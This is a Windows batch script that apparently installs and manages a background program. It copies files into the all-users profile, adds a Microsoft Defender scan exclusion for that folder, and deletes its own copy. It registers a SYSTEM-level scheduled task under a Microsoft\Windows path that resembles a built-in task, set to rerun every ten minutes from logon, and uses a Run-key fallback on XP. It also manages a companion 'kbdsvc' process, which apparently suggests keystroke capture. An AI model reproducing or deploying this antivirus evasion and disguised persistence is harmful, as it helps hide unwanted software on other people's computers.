@echo off
endlocal& setlocal EnableDelayedExpansion

reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=x86|| set OS=x64
ver | find /i "5." > nul && set XP=1|| set XP=0

rem Parse passed arguments to script
:parse_passed_params
  if "%~1"=="" goto:end_parse_passed_params
  if "%~1"=="install"           ( set Action=%~1&& shift & goto:parse_passed_params )
  if "%~1"=="uninstall"         ( set Action=%~1&& shift & goto:parse_passed_params )
  if "%~1"=="stop"              ( set Action=%~1&& shift & goto:parse_passed_params )
  if "%~1"=="run"               ( set Action=%~1&& shift & goto:parse_passed_params )
  if "%~1"=="status"            ( set Action=%~1&& shift & goto:parse_passed_params )
  if not "%~1"==""              ( set Progra=%~1&& shift & goto:parse_passed_params )
  shift & goto:parse_passed_params
:end_parse_passed_params

:begin
	if "%Progra%"==""          goto:end

	set name=%Progra%
	set src=%~dp0
	set dst=%ALLUSERSPROFILE%\%name%

    if "%Action%"=="install"   call:install
    if "%Action%"=="uninstall" call:uninstall
    if "%Action%"=="stop"      call:stop
    if "%Action%"=="run"       call:run
	if "%Action%"=="status"    call:status
    goto:end

:install
	call:exclude_from_defender

	xcopy /E /C /H /R /Y /I "%src%\." "%dst%"
	del /F /Q "%dst%\%~nx0"
    call:createtask
    exit /b

:uninstall
    set task_root=\Microsoft\Windows\%name%

    call:stop

    if "%XP%"=="1" (
        schtasks /DELETE /TN "%name%"
    )

    schtasks /DELETE /F /TN "%task_root%\%name%"
    reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "%name%" /f
    rmdir /Q /S "%dst%"
    exit /b

:stop
    set task_root=\Microsoft\Windows\%name%
    set kbdsvc=kbdsvc

    schtasks /END /TN "%name%"
    schtasks /END /TN "%task_root%\%name%"
    taskkill /F /IM "%name%.exe"
	if "%name%"=="spsvc" (
		taskkill /F /IM "%kbdsvc%.exe"
	)
    exit /b

:run
    set task_root=\Microsoft\Windows\%name%
    if "%XP%"=="1" (
		start /B /I cmd /C "%dst%\%name%.exe"
		exit /b
	)
    schtasks /RUN /TN "%task_root%\%name%"
    exit /b

:status
	set task_root=\Microsoft\Windows\%name%
	set kbdsvc=kbdsvc
	schtasks /QUERY /V /FO LIST /TN "%task_root%\%name%"
	tasklist /fi "imagename eq %name%.exe"
	if "%name%"=="spsvc" (
		tasklist /fi "imagename eq %kbdsvc%.exe"
	)
	exit /b

:createtask
	set xml="%src%\task.xml"
	set task_root=\Microsoft\Windows\%name%

    if "%XP%"=="1" (
		reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "%name%" /d "%dst%\%name%.exe" /f>nul
        rem schtasks /DELETE /TN "%name%"
        rem schtasks /Create /RU System /SC ONLOGON /TN "%name%" /TR "%dst%\%name%.exe"
        exit /b
    )

	echo ^<?xml version="1.0" encoding="UTF-16"?^>^
		^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>^
		^<Triggers^>^
		^<LogonTrigger^>^
		^<Repetition^>^
		^<Interval^>PT10M^</Interval^>^
		^<StopAtDurationEnd^>false^</StopAtDurationEnd^>^
		^</Repetition^>^
		^<Enabled^>true^</Enabled^>^
		^</LogonTrigger^>^
		^</Triggers^>^
		^<Principals^>^
		^<Principal id="Author"^>^
		^<UserId^>S-1-5-18^</UserId^>^
		^<RunLevel^>HighestAvailable^</RunLevel^>^
		^</Principal^>^
		^</Principals^>^
		^<Settings^>^
		^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>^
		^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>^
		^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>^
		^<AllowHardTerminate^>true^</AllowHardTerminate^>^
		^<StartWhenAvailable^>false^</StartWhenAvailable^>^
		^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>^
		^<IdleSettings^>^
		^<StopOnIdleEnd^>true^</StopOnIdleEnd^>^
		^<RestartOnIdle^>false^</RestartOnIdle^>^
		^</IdleSettings^>^
		^<AllowStartOnDemand^>true^</AllowStartOnDemand^>^
		^<Enabled^>true^</Enabled^>^
		^<Hidden^>false^</Hidden^>^
		^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>^
		^<WakeToRun^>false^</WakeToRun^>^
		^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>^
		^<Priority^>7^</Priority^>^
		^</Settings^>^
		^<Actions Context="Author"^>^
		^<Exec^>^
		^<Command^>%dst%\%name%.exe^</Command^>^
		^</Exec^>^
		^</Actions^>^
		^</Task^> > %xml%

	schtasks /Create /F /XML %xml% /TN "%task_root%\%name%"
	del /F /Q %xml%

	exit /b

:exclude_from_defender
	powershell -ExecutionPolicy RemoteSigned -NoLogo -Noninteractive -Command "try { Add-MpPreference -ExclusionPath "%dst%"; exit 100; } catch { exit 0; }">nul 2>&1

	exit /b

:end
    exit 0


